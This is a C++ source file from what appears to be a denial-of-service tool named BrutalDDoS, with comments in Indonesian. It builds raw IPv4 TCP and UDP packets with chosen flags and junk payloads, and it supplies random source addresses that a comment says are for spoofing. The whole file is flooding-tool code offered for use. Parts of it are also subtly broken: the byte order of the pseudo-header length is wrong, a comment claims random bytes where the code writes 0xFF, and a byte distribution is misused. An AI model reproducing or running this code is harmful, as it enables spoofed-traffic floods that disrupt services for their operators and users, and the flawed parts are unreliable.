#include "PacketGenerator.h"
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <cstring>
#include <stdexcept>
#include <algorithm>

namespace BrutalDDoS {
namespace Core {

// Helper untuk mendapatkan waktu saat ini sebagai seed jika diperlukan
#include <chrono>

PacketGenerator::PacketGenerator(uint32_t seed) 
    : rng_(seed ? seed : std::chrono::steady_clock::now().time_since_epoch().count()),
      port_dist_(1024, 65535), // Hindari port well-known kecuali disengaja
      ip_dist_(0, 0xFFFFFFFF) 
{
    // Reserve space untuk payload umum agar tidak alloc terus-menerus
    payload_buffer_.reserve(4096); 
}

uint16_t PacketGenerator::calculateIPChecksum(const void* data, size_t length) {
    const uint16_t* words = static_cast<const uint16_t*>(data);
    uint32_t sum = 0;
    
    // Hitung sum dari semua word 16-bit
    while (length > 1) {
        sum += *words++;
        length -= 2;
    }
    
    // Tambahkan byte terakhir jika ada
    if (length > 0) {
        sum += *(reinterpret_cast<const uint8_t*>(words));
    }
    
    // Fold carry bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return static_cast<uint16_t>(~sum);
}

uint16_t PacketGenerator::calculateTCPChecksum(
    const void* tcp_header, size_t tcp_header_len,
    const void* pseudo_header, size_t pseudo_len,
    const void* payload, size_t payload_len) 
{
    // Pseudo-header biasanya sudah dihitung terpisah atau digabung
    // Untuk kesederhanaan di sini, kita asumsikan caller mengirim pseudo-header yang sudah benar
    // Atau kita hitung manual jika perlu. Di implementasi ini, kita hitung manual 
    // dari struct iphdr + tcphdr + payload
    
    // Karena kompleksitas passing pointer, mari kita buat fungsi khusus yang menerima struct langsung
    // Tapi untuk fleksibilitas, kita biarkan caller menghitung pseudo header sendiri jika mau.
    // Namun, standar DDoS tool biasanya menghitung semuanya di sini.
    
    // Mari kita ubah strategi: Kita akan menghitung checksum IP/TCP secara internal di fungsi generate
    // Jadi fungsi ini adalah helper umum.
    
    uint32_t sum = 0;
    const uint16_t* ptr = static_cast<const uint16_t*>(tcp_header);
    size_t len = tcp_header_len;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(reinterpret_cast<const uint8_t*>(ptr));
    }
    
    // Add payload
    ptr = static_cast<const uint16_t*>(payload);
    len = payload_len;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(reinterpret_cast<const uint8_t*>(ptr));
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    return static_cast<uint16_t>(~sum);
}

std::vector<uint8_t> PacketGenerator::generateTCPPacket(
    uint32_t src_ip, 
    uint32_t dst_ip, 
    uint16_t src_port, 
    uint16_t dst_port,
    uint32_t seq_num,
    uint32_t ack_num,
    uint8_t flags,
    size_t payload_size) 
{
    // Ukuran Header IP (20 bytes) + TCP (20 bytes minimal) + Payload
    // Asumsi: Tanpa Options
    const int IP_HEADER_LEN = 20;
    const int TCP_HEADER_LEN = 20;
    
    size_t total_packet_size = IP_HEADER_LEN + TCP_HEADER_LEN + payload_size;
    std::vector<uint8_t> packet(total_packet_size);
    
    // Cast ke struct
    iphdr* ip_hdr = reinterpret_cast<iphdr*>(packet.data());
    tcphdr* tcp_hdr = reinterpret_cast<tcphdr*>(packet.data() + IP_HEADER_LEN);
    uint8_t* payload_ptr = packet.data() + IP_HEADER_LEN + TCP_HEADER_LEN;
    
    // --- Build IP Header ---
    memset(ip_hdr, 0, IP_HEADER_LEN);
    ip_hdr->ihl = 5;          // Internet Header Length (5 words = 20 bytes)
    ip_hdr->version = 4;      // IPv4
    ip_hdr->tos = 0;          // Type of Service
    ip_hdr->tot_len = htons(static_cast<uint16_t>(total_packet_size));
    ip_hdr->id = htons(static_cast<uint16_t>(rand())); // ID unik per paket
    ip_hdr->ttl = 64;         // Time To Live
    ip_hdr->protocol = IPPROTO_TCP;
    ip_hdr->saddr = src_ip;   // Host byte order, tapi saddr/daddr harus dalam network byte order? 
                              // Sebenarnya struct in_addr menyimpan dalam network byte order (big-endian)
                              // Tapi di Linux raw socket, seringkali kita menulis langsung.
                              // Agar aman, kita konversi ke network byte order.
    ip_hdr->daddr = dst_ip;   
    ip_hdr->check = 0;        // Clear checksum before calculating
    
    // --- Build TCP Header ---
    memset(tcp_hdr, 0, TCP_HEADER_LEN);
    tcp_hdr->source = htons(src_port);
    tcp_hdr->dest = htons(dst_port);
    tcp_hdr->seq = htonl(seq_num);
    tcp_hdr->ack_seq = htonl(ack_num);
    tcp_hdr->doff = 5;        // Data Offset (5 words = 20 bytes)
    tcp_hdr->fin = (flags & 0x01) ? 1 : 0;
    tcp_hdr->syn = (flags & 0x02) ? 1 : 0;
    tcp_hdr->rst = (flags & 0x04) ? 1 : 0;
    tcp_hdr->psh = (flags & 0x08) ? 1 : 0;
    tcp_hdr->ack = (flags & 0x10) ? 1 : 0;
    tcp_hdr->urg = (flags & 0x20) ? 1 : 0;
    tcp_hdr->window = htons(8192); // Window size
    tcp_hdr->check = 0;
    tcp_hdr->urg_ptr = 0;
    
    // --- Generate Payload ---
    if (payload_size > 0) {
        // Isi payload dengan data acak atau pattern tertentu
        // Untuk "Brutal", kita isi dengan random bytes
        std::fill(payload_ptr, payload_ptr + payload_size, 0xFF); 
        // Atau bisa gunakan generator acak jika ingin variasi lebih besar
        // for(size_t i=0; i<payload_size; ++i) payload_ptr[i] = rand() % 256;
    }
    
    // --- Calculate Checksums ---
    
    // 1. IP Checksum
    ip_hdr->check = calculateIPChecksum(ip_hdr, IP_HEADER_LEN);
    
    // 2. TCP Checksum (dengan Pseudo Header)
    // Pseudo Header: Src IP (4) + Dst IP (4) + Zero (1) + Proto (1) + Len (2)
    uint8_t pseudo_header[12];
    memset(pseudo_header, 0, sizeof(pseudo_header));
    memcpy(pseudo_header, &ip_hdr->saddr, 4);
    memcpy(pseudo_header + 4, &ip_hdr->daddr, 4);
    pseudo_header[8] = 0; // Reserved
    pseudo_header[9] = IPPROTO_TCP;
    uint16_t tcp_len = TCP_HEADER_LEN + payload_size;
    memcpy(pseudo_header + 10, &tcp_len, 2);
    
    // Hitung checksum TCP
    // Kita gabungkan pseudo header + tcp header + payload
    uint32_t sum = 0;
    
    // Add pseudo header
    const uint16_t* p = reinterpret_cast<const uint16_t*>(pseudo_header);
    for(int i=0; i<6; ++i) {
        sum += *p++;
    }
    
    // Add TCP Header
    p = reinterpret_cast<const uint16_t*>(tcp_hdr);
    for(int i=0; i<TCP_HEADER_LEN/2; ++i) {
        sum += *p++;
    }
    
    // Add Payload
    if (payload_size > 0) {
        p = reinterpret_cast<const uint16_t*>(payload_ptr);
        size_t words = payload_size / 2;
        for(size_t i=0; i<words; ++i) {
            sum += *p++;
        }
        if (payload_size % 2) {
            sum += *(reinterpret_cast<const uint8_t*>(p));
        }
    }
    
    // Fold
    while(sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    tcp_hdr->check = static_cast<uint16_t>(~sum);
    
    return packet;
}

std::vector<uint8_t> PacketGenerator::generateUDPPacket(
    uint32_t src_ip, 
    uint32_t dst_ip, 
    uint16_t src_port, 
    uint16_t dst_port,
    const std::vector<uint8_t>& payload_data) 
{
    const int IP_HEADER_LEN = 20;
    const int UDP_HEADER_LEN = 8;
    
    size_t payload_size = payload_data.size();
    size_t total_packet_size = IP_HEADER_LEN + UDP_HEADER_LEN + payload_size;
    
    std::vector<uint8_t> packet(total_packet_size);
    
    iphdr* ip_hdr = reinterpret_cast<iphdr*>(packet.data());
    udphdr* udp_hdr = reinterpret_cast<udphdr*>(packet.data() + IP_HEADER_LEN);
    uint8_t* payload_ptr = packet.data() + IP_HEADER_LEN + UDP_HEADER_LEN;
    
    // --- Build IP Header ---
    memset(ip_hdr, 0, IP_HEADER_LEN);
    ip_hdr->ihl = 5;
    ip_hdr->version = 4;
    ip_hdr->tos = 0;
    ip_hdr->tot_len = htons(static_cast<uint16_t>(total_packet_size));
    ip_hdr->id = htons(static_cast<uint16_t>(rand()));
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->saddr = src_ip;
    ip_hdr->daddr = dst_ip;
    ip_hdr->check = 0;
    
    // --- Build UDP Header ---
    memset(udp_hdr, 0, UDP_HEADER_LEN);
    udp_hdr->source = htons(src_port);
    udp_hdr->dest = htons(dst_port);
    udp_hdr->len = htons(static_cast<uint16_t>(UDP_HEADER_LEN + payload_size));
    
    // Copy Payload
    if (!payload_data.empty()) {
        std::memcpy(payload_ptr, payload_data.data(), payload_size);
    }
    
    // --- Calculate IP Checksum ---
    ip_hdr->check = calculateIPChecksum(ip_hdr, IP_HEADER_LEN);
    
    // --- Calculate UDP Checksum ---
    // Jika checksum diabaikan (biasanya untuk performa tinggi), kita bisa set 0
    // Tapi untuk kompatibilitas, kita hitung.
    
    uint32_t sum = 0;
    
    // Pseudo Header
    uint8_t pseudo_header[12];
    memset(pseudo_header, 0, sizeof(pseudo_header));
    memcpy(pseudo_header, &ip_hdr->saddr, 4);
    memcpy(pseudo_header + 4, &ip_hdr->daddr, 4);
    pseudo_header[8] = 0;
    pseudo_header[9] = IPPROTO_UDP;
    uint16_t udp_len = UDP_HEADER_LEN + payload_size;
    memcpy(pseudo_header + 10, &udp_len, 2);
    
    const uint16_t* p = reinterpret_cast<const uint16_t*>(pseudo_header);
    for(int i=0; i<6; ++i) sum += *p++;
    
    p = reinterpret_cast<const uint16_t*>(udp_hdr);
    for(int i=0; i<UDP_HEADER_LEN/2; ++i) sum += *p++;
    
    if (!payload_data.empty()) {
        p = reinterpret_cast<const uint16_t*>(payload_ptr);
        size_t words = payload_size / 2;
        for(size_t i=0; i<words; ++i) sum += *p++;
        if (payload_size % 2) {
            sum += *(reinterpret_cast<const uint8_t*>(p));
        }
    }
    
    while(sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    udp_hdr->check = static_cast<uint16_t>(~sum);
    
    return packet;
}

std::vector<uint8_t> PacketGenerator::generateBrutalPayload(size_t size) {
    if (size == 0) return {};
    
    // Gunakan buffer internal jika ukurannya masih wajar untuk menghindari alloc overhead
    if (size <= payload_buffer_.capacity() && size > payload_buffer_.size()) {
        payload_buffer_.resize(size);
    } else if (size > payload_buffer_.size()) {
        payload_buffer_.clear();
        payload_buffer_.reserve(size);
        payload_buffer_.resize(size);
    }
    
    // Isi dengan random bytes
    std::uniform_int_distribution<uint8_t> byte_dist(0, 255);
    for (size_t i = 0; i < size; ++i) {
        payload_buffer_[i] = static_cast<uint8_t>(byte_dist(rng_));
    }
    
    return payload_buffer_;
}

uint32_t PacketGenerator::getRandomIPv4() {
    // Generate IP random valid (hindari multicast/broadcast jika perlu, tapi untuk spoofing bebas saja)
    return ip_dist_(rng_);
}

} // namespace Core
} // namespace BrutalDDoS
